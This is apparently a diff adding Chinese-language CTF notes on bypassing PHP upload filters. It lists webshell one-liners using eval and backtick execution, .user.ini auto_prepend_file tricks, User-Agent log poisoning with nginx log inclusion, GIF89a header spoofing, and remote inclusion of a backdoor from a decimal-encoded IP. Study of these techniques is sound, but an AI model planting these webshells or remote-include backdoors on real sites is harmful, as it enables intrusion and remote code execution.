@@ -1,0 +1,42 @@
+assert()默认不在可以执行代码
+这就是众多马不能用的罪魁祸首了，太多的马用assert()来执行代码了，这个更新基本就团灭，一般情况下修改成eval即可正常运行了
+提一下，菜刀在实现文件管理器的时候用的恰好也是assert函数，这导致菜刀没办法在PHP7上正常运行。
+
+前端验证content-type
+可以直接删浏览器中的js，也可以抓包修改
+
+上传.user.ini   
+auto_prepend_file=test.png  再访问index.php 如下
+http://6b4dc890-5a9d-4a3d-8f9c-8e3e323811d7.challenge.ctf.show/upload/
+
+过滤写法
+使用反引号运算符的效果与函数 shell_exec()相同
+<?=eval($_POST["pass"]);
+<?=eval($_POST{x});?>
+<?=system('tac ../fl*')?>
+<? echo `tac /var/www/html/f*`?>
+
+包含默认日志，日志记录UA头，UA头写后门代码
+.user.ini：auto_prepend_file=test.png  //作用为把特定的文件按照php解析
+test.png：<?=include"/var/lo"."g/nginx/access.lo"."g"?>  //nginx的linux日志路径
+
+空格过滤试试换行
+
+文件头部检测是否为图片格式文件
+.user.ini：GIF89A auto_prepend_file=test.png
+test.png：GIF89A <?=include"/var/lo"."g/nginx/access.lo"."g"?>
+
+过滤 . () {} ;等
+利用远程包含IP转换地址后门调用执行
+.user.ini auto_prepend_file=png
+png <?=include'http://794750069/'>
+
+直接利用.user.ini包含远程
+auto_prepend_file=http://794750069/
+
+图片头
+gif:GIF89a
+等等
+
+二次渲染
+上传gif
